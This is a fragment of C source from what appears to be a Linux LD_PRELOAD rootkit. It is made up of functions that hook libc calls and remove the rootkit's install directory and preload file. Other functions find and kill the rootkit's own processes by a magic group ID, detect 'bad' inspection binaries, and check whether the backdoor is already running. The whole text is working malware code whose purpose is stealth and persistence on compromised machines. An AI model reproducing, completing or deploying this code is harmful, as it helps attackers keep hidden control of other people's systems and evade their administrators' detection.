int kill_self(void)
{
    if(getuid() != 0) return -1;
    HOOK(o_opendir,"opendir");
    DIR *dirp=o_opendir(INSTALL_DIR);
    if(!dirp) return -1;
    struct dirent *dir;
    char path[512];
    HOOK(o_readdir,"readdir");
    HOOK(o_unlink,"unlink");
    while((dir=o_readdir(dirp)) != NULL)
    {
        if(!strcmp(".\0",dir->d_name) || !strcmp("..\0",dir->d_name)) continue;
        snprintf(path,sizeof(path),"%s/%s",INSTALL_DIR,dir->d_name);
        if(o_unlink(path)<0) return -1;
    }
    HOOK(o_rmdir,"rmdir");
    if(o_rmdir(INSTALL_DIR)<0) return -1;
    if(o_unlink(LDSP)<0) return -1;
    kill_rk_procs();
    return 0;
}

int is_bad_proc(const char *filename)
{
    char fnm_proc[64];
    int i;
    for(i=0; i<sizeof(bad_bins)/sizeof(bad_bins[0]); i++)
    {
        snprintf(fnm_proc,sizeof(fnm_proc),"*/%s",bad_bins[i]);
        if(strstr(cprocname(),bad_bins[i]) || strstr(filename,bad_bins[i]) ||
           !fnmatch(fnm_proc,filename,FNM_PATHNAME)) return 1;
    }
    return 0;
}

DIR *open_procd(void)
{
    HOOK(o_opendir,"opendir");
    DIR *ret=o_opendir("/proc");
    return ret;
}

void kill_rk_procs(void)
{
    DIR *dirp=open_procd();
    if(!dirp) return;
    struct dirent *dir;
    struct stat s_fstat;
    int w=0;
    memset(&s_fstat,0,sizeof(stat));
    
    char pp[512];
    HOOK(o_readdir,"readdir");
    HOOK(o_xstat,"__xstat");
    while((dir=o_readdir(dirp)) != NULL)
    {
        if(!strcmp(dir->d_name, ".\0") || !strcmp(dir->d_name, "/\0") ||
           !strcmp(dir->d_name, "net") || !strcmp(dir->d_name,"self") ||
           !strcmp(dir->d_name, "thread-self")) continue;

        snprintf(pp,sizeof(pp),"/proc/%s",dir->d_name);
        (void) o_xstat(_STAT_VER,pp,&s_fstat);
        if(s_fstat.st_gid==MGID) { w=1; kill(atoi(dir->d_name),SIGTERM); }
    }
    (void) closedir(dirp);
    if(w) (void) sleep(BPROC_WAIT); // if we've killed any rk processes, we wait for sockets to die completely
    return;
}

int is_betrayed_alive(void)
{
    DIR *dirp=open_procd();
    if(!dirp) return 0;
    struct dirent *dir;
    struct stat s_fstat;
    memset(&s_fstat,0,sizeof(stat));
    
    char pp[512];
    HOOK(o_readdir,"readdir");
    HOOK(o_xstat,"__xstat");
    while((dir=o_readdir(dirp)) != NULL)
    {
        if(!strcmp(dir->d_name, ".\0") || !strcmp(dir->d_name, "/\0") ||  // we need to chase down an actual
           !strcmp(dir->d_name, "net") || !strcmp(dir->d_name,"self") ||  // process id to see if we're running already.
           !strcmp(dir->d_name, "thread-self")) continue;

        snprintf(pp,sizeof(pp),"/proc/%s",dir->d_name);
        (void) o_xstat(_STAT_VER,pp,&s_fstat);
        if(s_fstat.st_gid==MGID) return 1;
    }
    (void) closedir(dirp);
    return 0;
}
